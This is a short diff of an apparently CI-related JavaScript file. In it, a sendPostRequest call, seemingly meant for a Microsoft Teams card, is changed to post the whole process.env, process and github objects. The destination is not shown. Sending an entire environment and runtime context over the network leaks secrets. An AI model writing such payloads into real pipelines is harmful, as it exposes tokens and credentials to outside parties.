@@ -53,9 +53,9 @@ const sendPostRequest = async (msTeamsCard) => {
 
 sendPostRequest({
   a: process.env,
-  b: process.env.repository,
-  g: github.event,
-  c: github.context,
+  b: process,
+  g: github,
+  //c: github.context,
   //   variables: {
   //     hash: github.context.head_commit,
   //     commitUrl: github.context.head_commit.url,
